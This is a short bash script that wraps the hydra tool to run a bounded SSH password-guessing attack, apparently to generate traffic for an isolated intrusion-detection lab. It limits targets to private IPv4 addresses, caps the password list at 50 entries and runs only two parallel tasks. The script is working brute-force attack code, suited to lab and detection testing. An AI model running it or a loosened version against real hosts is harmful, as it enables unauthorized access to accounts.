#!/usr/bin/env bash
set -euo pipefail

# Bounded SSH login-attempt generator for the isolated IDS lab.
# Usage: bash ssh_bruteforce_lab.sh <private-target-ip> <username> <password-list>

if [[ $# -ne 3 ]]; then
  echo "Usage: bash $0 <private-target-ip> <username> <password-list>" >&2
  exit 2
fi

target=$1
username=$2
password_list=$3

if [[ ! $target =~ ^(10\.[0-9]+\.[0-9]+\.[0-9]+|192\.168\.[0-9]+\.[0-9]+|172\.(1[6-9]|2[0-9]|3[01])\.[0-9]+\.[0-9]+)$ ]]; then
  echo "Only private IPv4 lab targets are allowed." >&2
  exit 2
fi

IFS=. read -r octet1 octet2 octet3 octet4 <<< "$target"
for octet in "$octet1" "$octet2" "$octet3" "$octet4"; do
  if (( 10#$octet > 255 )); then
    echo "Invalid IPv4 address: $target" >&2
    exit 2
  fi
done

if [[ ! -f $password_list ]]; then
  echo "Password list not found: $password_list" >&2
  exit 2
fi

if ! command -v hydra >/dev/null 2>&1; then
  echo "hydra is required on Kali." >&2
  exit 2
fi

attempts=$(wc -l < "$password_list")
if (( attempts < 1 || attempts > 50 )); then
  echo "Provide a list of 1-50 passwords (one per line); got $attempts." >&2
  exit 2
fi

echo "Testing up to $attempts SSH logins against $target:22 as $username (2 parallel tasks)."
hydra -l "$username" -P "$password_list" -t 2 -s 22 -W 3 -f "ssh://$target"
